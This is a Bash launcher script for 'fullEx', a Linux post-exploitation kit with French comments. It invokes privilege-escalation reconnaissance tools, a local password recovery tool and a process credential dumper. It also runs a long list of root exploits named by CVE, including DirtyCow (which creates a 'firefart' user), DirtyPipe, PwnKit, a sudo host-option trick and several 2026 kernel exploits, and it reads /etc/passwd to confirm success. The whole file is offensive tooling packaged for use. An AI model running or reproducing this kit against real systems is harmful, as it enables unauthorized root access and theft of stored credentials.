#!/bin/bash

# Banniere
ban() {
     cat <<"EOF"
                                                    
 $$$$$$\            $$\ $$\ $$$$$$$$\           
$$  __$$\           $$ |$$ |$$  _____|          
$$ /  \__|$$\   $$\ $$ |$$ |$$ |      $$\   $$\ 
$$$$\     $$ |  $$ |$$ |$$ |$$$$$\    \$$\ $$  |
$$  _|    $$ |  $$ |$$ |$$ |$$  __|    \$$$$  / 
$$ |      $$ |  $$ |$$ |$$ |$$ |       $$  $$<  
$$ |      \$$$$$$  |$$ |$$ |$$$$$$$$\ $$  /\$$\ 
\__|       \______/ \__|\__|\________|\__/  \__|

               by M0rPH3U53
EOF
}

if [[ "$*" == "-help" ]]; then
     ban
echo " "
     echo " "
     echo "Usage: ./fullEx.sh COMMAND"
     echo " "
     echo "───────────────────────────────────────────────"
     echo "                   🧰 Outils                   "
     echo "───────────────────────────────────────────────"
     echo " "
     echo "   -LinPeas      Script d'escalade de privilèges"
     echo "   -LaZagne      Récupére les mots de passe local"
     echo "   -Pspy64/32    Récupére les processus en cours"
     echo "   -DumpCred     Extraits les creds de processus"
     echo " "
     echo "───────────────────────────────────────────────"
     echo "                   💀 Exploits                 "
     echo "───────────────────────────────────────────────"
     echo " "
     echo "   -Overlays      Overlays - CVE-2015-1328"
     echo "   -DirtyCow      DirtyCow - CVE-2016-5195"
     echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
     echo "   -DirtyPipe     DirtyPipe - CVE-2022-0847"
     echo "   -Host          Sudo Host - CVE-2025-32462"
     echo "   -CFail         Copy Fail - CVE-2026-31431"
     echo "   -PKroot        Pack2TheRoot - CVE-2026-41651"
     echo "   -DirtyFrag     Dirty Frag - CVE-2026-43284"
     echo "   -Fragnesia     Fragnesia - CVE-2026-46300"
     echo "   -SKP           ssh-keysign-pwn - CVE-2026-46333"
     echo "   -PeditCow      Pedit Cow - CVE-2026-46331"
     echo "   -DirtyClone    DirtyClone - CVE-2026-43503"
     echo " "
     echo "──────────────────────────────────────────────────"
     echo "                   ⚙️ Commandes                   "
     echo "──────────────────────────────────────────────────"
     echo " "
     echo "   -check         Verifie gcc & python"
     echo "   -perm          Applique droit d'execution fullex"
     echo "   -help          Affiche les commandes"
     echo " "
     echo "───────────────────────────────────────────────────"
     exit 0
fi

################################################## Cmds ##################################################

# Applique droit d'execution sur le dossier fullEx
if [[ "$*" == "-perm" ]]; then
   find ${PWD} -type f -exec chmod +x {} \;
   echo "[+] Droit d'éxécution appliqué !"
fi

# Verifie si GCC & Python sont installé
if [[ "$*" == "-check-install" ]]; then
     if which gcc >/dev/null 2>&1; then
          echo "[+] GCC found!"
     else
          echo "[-] GCC not found!"
     fi

     if which python >/dev/null 2>&1; then
          echo "[+] Python found!"
     else
          echo "[-] Python not found!"
     fi
fi

################################################## Outils ##################################################

# LinPeas
if [[ "$*" == "-LinPeas" ]]; then
   "${PWD}/outils/linpeas/linpeas.sh"
fi

# LaZagne
if [[ "$*" == "-LaZagne" ]]; then
  "${PWD}/outils/LaZagne/Linux/laZagne.py"
fi

# Pspy
for arch in 64 32; do
     if [[ "$*" == "-Pspy${arch}" ]]; then
          "${PWD}/outils/pspy/pspy${arch}"
     fi
done

# DumpCred
if [[ "$*" == "-DumpCred" ]]; then 
     ${PWD}/outils/Dumpcreds/dumpcreds -D
fi

################################################## Exploits ##################################################

# PwnKit
for arch in 64 32; do
     if [[ "$*" == "-PwnKit${arch}" ]]; then
          "${PWD}/exploits/PwnKit/PwnKit${arch}"
     fi
done

# Overlays
if [[ "$*" == "-Overlays" ]]; then
     ${PWD}/exploits/Overlays/overlays
fi

# DirtyCow
if [[ "$*" == "-DirtyCow" ]]; then
     ${PWD}/exploits/DirtyCow/dcow test
     echo "[+] User firefart created"
     cat /etc/passwd | grep 'firefart'
fi

# DirtyPipe
if [[ "$*" == "-DirtyPipe" ]]; then
     ${PWD}/exploits/DirtyPipe/dpipe --root
     cat /etc/passwd | grep root
fi

# Sudo-Host
if [[ "$*" == "-Host" ]]; then
     sudo -h dev.test.local -i
fi

# Copy-Fail
if [[ "$*" == "-CFail" ]]; then
     ${PWD}/exploits/CopyFail/copyfail
fi

# Pack2TheRoot 
if [[ "$*" == "-PKroot" ]]; then
     ${PWD}/exploits/Pack2TheRoot/pkroot.sh
fi

# DirtyFrag
if [[ "$*" == "-DirtyFrag" ]]; then
     ${PWD}/exploits/DirtyFrag/dirtyfrag
fi

# Fragnesia
if [[ "$*" == "-Fragnesia" ]]; then
     ${PWD}/exploits/Fragnesia/fragnesia
fi

# ssh-keysign-pwn
if [[ "$*" == "-SKP" ]]; then
     ${PWD}/exploits/ssh-keysign-pwn/skp /usr/bin/su
fi

# PeditCow
if [[ "$*" == "-PeditCow" ]]; then
     ${PWD}/exploits/PeditCow/a.out
fi

# DirtyClone
if [[ "$*" == "-DirtyClone" ]]; then
  "${PWD}/exploits/DirtyClone/dirtyclone.py"
fi
